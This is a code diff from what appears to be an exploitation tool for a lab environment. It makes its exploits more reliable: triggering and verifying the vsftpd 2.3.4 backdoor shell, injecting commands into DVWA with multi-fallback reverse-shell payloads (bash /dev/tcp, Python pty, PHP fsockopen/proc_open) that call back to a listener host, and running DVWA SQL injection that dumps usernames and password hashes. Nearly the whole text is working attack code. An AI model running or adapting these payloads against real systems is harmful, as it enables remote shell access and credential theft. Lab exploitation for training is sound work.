@@ -4263,22 +4263,38 @@ async def exploit_vsftpd_234(target: str, sid: str) -> dict:
                           f"`docker restart lab_metasploitable`"),
                 "cve": "CVE-2011-2523"}
 
-    # Step 5 — VERIFY the shell is alive (send `id`, expect `uid=`)
+    # Step 5 — VERIFY the shell is alive (send `id`, expect `uid=`). The
+    # backdoor /bin/sh is dropped into a raw socket with no TTY, so its
+    # stdout buffering is unpredictable. Send twice and read in a loop with
+    # short timeouts so we accumulate output until `uid=` appears OR we hit
+    # a total budget of 7 seconds.
     try:
-        writer.write(b"id\n"); await writer.drain()
-        verify = await asyncio.wait_for(reader.read(1024), timeout=4)
-        verify_str = verify.decode("utf-8", errors="replace")
+        writer.write(b"id\nid\n"); await writer.drain()
+        await asyncio.sleep(0.4)
+        verify_str = ""
+        for _ in range(14):  # 14 * 0.5s = 7s total
+            try:
+                chunk = await asyncio.wait_for(reader.read(2048), timeout=0.5)
+                if chunk:
+                    verify_str += chunk.decode("utf-8", errors="replace")
+                    if "uid=" in verify_str:
+                        break
+            except asyncio.TimeoutError:
+                continue
         if "uid=" not in verify_str:
             try: writer.close()
             except Exception: pass
             return {"ok": False,
-                    "error": f"Port 6200 connected but no /bin/sh on the other end. Got: '{verify_str[:200]}'. Restart metasploitable: docker restart lab_metasploitable",
+                    "error": (f"Connected to port 6200 but /bin/sh did not echo `uid=` within 7s "
+                              f"(got: '{verify_str[:160]}'). The backdoor may have been already "
+                              f"triggered earlier this session — restart the container: "
+                              f"docker restart lab_metasploitable"),
                     "cve": "CVE-2011-2523"}
-    except asyncio.TimeoutError:
+    except Exception as e:
         try: writer.close()
         except Exception: pass
         return {"ok": False,
-                "error": "Connected to port 6200 but shell did not respond to `id` within 4 seconds. The container may be running a stub vsftpd without the real backdoor. Restart it: docker restart lab_metasploitable",
+                "error": f"Shell verification failed: {e}. Try: docker restart lab_metasploitable",
                 "cve": "CVE-2011-2523"}
 
     # Step 6 — shell is proven live; hand it to the session manager
@@ -4351,12 +4367,13 @@ async def exploit_dvwa_cmdi(target: str, port: int, sid: str, lhost: str, lport:
     except Exception as e:
         return {"ok": False, "error": f"Could not bind reverse-shell port {lport}: {e}",
                 "cve": "DVWA-CMDI-Low"}
-    # 5. Build a base64-encoded payload. Encoding sidesteps every quoting
-    #    problem (DVWA's shell_exec already wraps things in single quotes;
-    #    nested quotes in the injection break parsing). The decode-and-exec
-    #    runner tries bash first, then python3, then python — first that
-    #    works wins. base64 contains only [A-Za-z0-9+/=] so it survives
-    #    URL-encoding and any PHP magic-quotes layer intact.
+    # 5. Multi-runner payload. The DVWA container may or may not have bash
+    #    with /dev/tcp support, python(3), nc, or socat — but PHP is
+    #    GUARANTEED because DVWA is a PHP app. PHP's fsockopen + exec is
+    #    the most reliable runner; we still try bash and python first so
+    #    that, where they work, we get a richer (PTY-spawned) shell.
+    #    base64 wraps the bash and python payloads so nested-quote pain
+    #    in DVWA's shell_exec doesn't trash the command.
     bash_rs   = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
     python_rs = (f"import socket,os,pty\n"
                  f"s=socket.socket()\n"
@@ -4365,11 +4382,20 @@ async def exploit_dvwa_cmdi(target: str, port: int, sid: str, lhost: str, lport:
                  f"pty.spawn('/bin/sh')")
     bash_b64   = _xpl_b64.b64encode(bash_rs.encode()).decode().strip()
     python_b64 = _xpl_b64.b64encode(python_rs.encode()).decode().strip()
+    # PHP one-liner — single-quoted so bash does NOT expand $s; PHP uses
+    # double-quoted strings inside for host + exec command.
+    php_rs = ("$s=fsockopen(\"" + lhost + "\"," + str(lport) +
+              ");$p=proc_open(\"/bin/sh -i\",[$s,$s,$s],$pipes);")
+    # If proc_open isn't available (rare), fall back to exec /dev/fd trick.
+    php_alt = ("$s=fsockopen(\"" + lhost + "\"," + str(lport) +
+               ");exec(\"/bin/sh -i <&3 >&3 2>&3\");")
     payload = (
         f"127.0.0.1; ("
-        f"(echo {bash_b64}|base64 -d|bash) || "
-        f"(python3 -c \"import base64;exec(base64.b64decode('{python_b64}'))\") || "
-        f"(python -c \"import base64;exec(base64.b64decode('{python_b64}'))\")"
+        f"(echo {bash_b64}|base64 -d|bash 2>/dev/null)"
+        f" || (php -r '{php_rs}' 2>/dev/null)"
+        f" || (php -r '{php_alt}' 2>/dev/null)"
+        f" || (python3 -c \"import base64;exec(base64.b64decode('{python_b64}'))\" 2>/dev/null)"
+        f" || (python -c \"import base64;exec(base64.b64decode('{python_b64}'))\" 2>/dev/null)"
         f") >/dev/null 2>&1 &"
     )
     try:
@@ -4384,17 +4410,19 @@ async def exploit_dvwa_cmdi(target: str, port: int, sid: str, lhost: str, lport:
         pass  # fire-and-forget — the bash may not return cleanly
     # 6. Accept the reverse shell (extended timeout, the longer multi-fallback
     #    payload can take a moment to traverse its fallbacks)
-    listener_sock.settimeout(20)
+    listener_sock.settimeout(25)
     try:
         conn, addr = listener_sock.accept()
     except _xpl_socket.timeout:
         try: listener_sock.close()
         except Exception: pass
         return {"ok": False,
-                "error": (f"Target did not call back within 20s. Tried bash /dev/tcp, "
-                          f"python/python3, nc -e, and nc+mkfifo to {lhost}:{lport}. "
-                          f"Check that lab_dvwa can reach the backend container on the bridge "
-                          f"and that the listener port is bind-able."),
+                "error": (f"Target did not call back within 25s. Tried bash /dev/tcp, "
+                          f"PHP fsockopen+proc_open, PHP fsockopen+exec, python3, and python — "
+                          f"all to {lhost}:{lport}. Possible causes: the DVWA container cannot "
+                          f"route to the backend container on the docker bridge, an iptables/"
+                          f"firewall rule between them, or none of bash/php/python are present "
+                          f"in the DVWA image (very unlikely)."),
                 "cve": "DVWA-CMDI-Low",
                 "payload": payload}
     listener_sock.close()
@@ -4443,20 +4471,45 @@ async def exploit_dvwa_sqli(target: str, port: int, sid: str) -> dict:
         # (which can produce duplicate Cookie headers Apache rejects with 400).
         sess.cookies.set("security", "low", path="/")
         sess.get(f"{base}/security.php?security=low", timeout=5, verify=False)
-        # UNION SELECT — dump users table. Use `#` (MySQL comment) instead
-        # of `-- -`; the dash-dash-space sequence in the URL trips some Apache
-        # configs into 400 Bad Request even after URL encoding.
-        payload = "1' UNION SELECT user,password FROM users#"
-        url = f"{base}/vulnerabilities/sqli/?id={_xpl_urlparse.quote(payload)}&Submit=Submit"
-        r = sess.get(url, timeout=10, verify=False)
-        # If we still get a 400, try once more with a different comment style.
-        if r.status_code == 400:
-            payload = "1' OR '1'='1' UNION SELECT user,password FROM users-- a"
-            url = f"{base}/vulnerabilities/sqli/?id={_xpl_urlparse.quote(payload)}&Submit=Submit"
-            r = sess.get(url, timeout=10, verify=False)
-        if r.status_code == 400:
+        # Three URL variants — some DVWA builds run on strict Apache configs
+        # that 400 on `/vulnerabilities/sqli/` (no DirectoryIndex), or on
+        # certain SQL-comment sequences in query strings.
+        payloads = [
+            "1' UNION SELECT user,password FROM users#",
+            "1' UNION SELECT user,password FROM users-- -",
+            "1' OR '1'='1",
+        ]
+        url_paths = [
+            "/vulnerabilities/sqli/index.php",
+            "/vulnerabilities/sqli/",
+        ]
+        r = None
+        payload = None
+        for url_path in url_paths:
+            for p in payloads:
+                u = f"{base}{url_path}?id={_xpl_urlparse.quote(p)}&Submit=Submit"
+                r = sess.get(u, timeout=10, verify=False)
+                if r.status_code == 200 and ("First name" in r.text or "<pre>" in r.text):
+                    payload = p
+                    break
+            if payload: break
+        # Last resort: POST the same payload — DVWA's $_REQUEST accepts both
+        if not payload:
+            for p in payloads:
+                r = sess.post(f"{base}/vulnerabilities/sqli/",
+                              data={"id": p, "Submit": "Submit"},
+                              timeout=10, verify=False)
+                if r.status_code == 200 and ("First name" in r.text or "<pre>" in r.text):
+                    payload = p
+                    break
+        if not payload or r.status_code != 200:
+            preview = (r.text[:200] if r is not None else "")
             return {"ok": False,
-                    "error": "Both SQLi payload variants returned HTTP 400 Bad Request from Apache. The DVWA build may have mod_security or a request filter blocking the injection.",
+                    "error": (f"SQLi request never returned 200 OK (last status: "
+                              f"{r.status_code if r is not None else 'no-response'}). "
+                              f"Tried 3 payload variants on 2 URL paths + a POST fallback. "
+                              f"The DVWA build may have mod_security blocking the injection. "
+                              f"Response preview: {preview}"),
                     "cve": "DVWA-SQLi-Low"}
         # DVWA renders one <pre> block per row. Walk the blocks and pull the
         # user + hash out of each by stripping HTML and scanning the plain text.
